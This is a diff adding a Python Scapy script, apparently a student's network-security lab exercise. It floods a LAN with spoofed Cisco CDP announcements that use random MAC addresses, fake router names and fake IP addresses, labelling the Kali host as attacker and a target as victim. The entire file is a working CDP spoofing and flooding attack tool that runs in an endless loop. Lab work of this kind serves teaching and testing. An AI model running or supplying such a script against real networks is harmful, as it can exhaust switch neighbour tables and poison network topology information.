@@ -1,0 +1,94 @@
+#!/usr/bin/env python3
+import sys
+import time
+import random
+import string
+import os
+from scapy.all import *
+
+# Cargar contribución CDP de Scapy
+load_contrib("cdp")
+
+# --- COMPATIBILIDAD ---
+# Asegurar compatibilidad con versiones diferentes de Scapy
+import scapy.contrib.cdp as cdp_mod
+def get_cls(name, alt):
+    return getattr(cdp_mod, name) if hasattr(cdp_mod, name) else getattr(cdp_mod, alt)
+
+try:
+    CDP_HDR = get_cls("CDPv2_HDR", "CDPv2_Hdr")
+    CDP_DevID = get_cls("CDPMsgDeviceID", "CDP_DevID")
+    CDP_PortID = get_cls("CDPMsgPortID", "CDP_PortID")
+    CDP_Addr = get_cls("CDPMsgAddr", "CDP_Address")
+    CDP_Cap = get_cls("CDPMsgCapabilities", "CDP_Capabilities")
+    CDP_Soft = get_cls("CDPMsgSoftwareVersion", "CDP_SoftwareVersion")
+    CDP_Plat = get_cls("CDPMsgPlatform", "CDP_Platform")
+except:
+    print("Error cargando módulos CDP. Asegúrate de tener Scapy actualizado.")
+    sys.exit(1)
+
+# --- CONFIGURACIÓN ---
+interfaz = "eth0"  # Ajusta esto si tu interfaz en Kali es diferente (ej. eth1)
+ip_victima_visual = "10.20.12.2" # IP de la Víctima corregida
+
+# Obtener IP del atacante automáticamente
+try:
+    ip_atacante = get_if_addr(interfaz)
+except:
+    ip_atacante = "10.20.12.50 (Estática/No detectada)"
+
+# --- INFORMACIÓN DEL ESTUDIANTE ---
+os.system('clear')
+print("-" * 50)
+print("ESTUDIANTE: Masucc Franco")
+print("MATRÍCULA:  2024-1250")
+print("-" * 50)
+print(f"IP ATACANTE (Kali): {ip_atacante}")
+print(f"IP VÍCTIMA (Obj):   {ip_victima_visual}")
+print("-" * 50)
+print("[*] Iniciando generación de tráfico CDP...")
+print("[*] Presiona Ctrl+C para pausar/detener.")
+print("-" * 50)
+
+# --- BUCLE DE GENERACIÓN ---
+try:
+    while True:
+        # Generar datos aleatorios para simular múltiples dispositivos
+        # Dirección MAC aleatoria
+        mac_rnd = "00:00:00:%02x:%02x:%02x" % (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
+        
+        # Nombre de dispositivo aleatorio
+        nombre_device = "Router_" + ''.join(random.choices(string.ascii_uppercase, k=4))
+        
+        # IP falsa dentro del rango 10.20.x.x
+        ip_fake = "10.20.%d.%d" % (random.randint(1, 254), random.randint(1, 254))
+
+        # Construcción del paquete CDP
+        packet = Ether(src=mac_rnd, dst="01:00:0c:cc:cc:cc") / \
+                 LLC(dsap=0xaa, ssap=0xaa, ctrl=3) / \
+                 SNAP(OUI=0x00000c, code=0x2000) / \
+                 CDP_HDR() / \
+                 CDP_DevID(val=nombre_device) / \
+                 CDP_Soft(val=b"Cisco IOS Software, C3750 Software (C3750-IPBASEK9-M), Version 12.2(55)SE") / \
+                 CDP_Plat(val=b"cisco WS-C3750G-24TS-1S") / \
+                 CDP_Addr(addr=[ip_fake]) / \
+                 CDP_PortID(iface=b"GigabitEthernet0/1") / \
+                 CDP_Cap(cap=0x01) # Router Capability
+
+        # Enviar paquete
+        sendp(packet, iface=interfaz, verbose=0)
+        
+        # Feedback visual simple (un punto por paquete)
+        sys.stdout.write(".")
+        sys.stdout.flush()
+        
+        # Pequeña pausa para no congelar la VM
+        time.sleep(0.2)
+
+except KeyboardInterrupt:
+    print("\n\n" + "=" * 50)
+    print("PAUSA: El script se ha detenido correctamente.")
+    print("Masucc Franco 2024-1250")
+    print("=" * 50)
+    sys.exit(0)
+
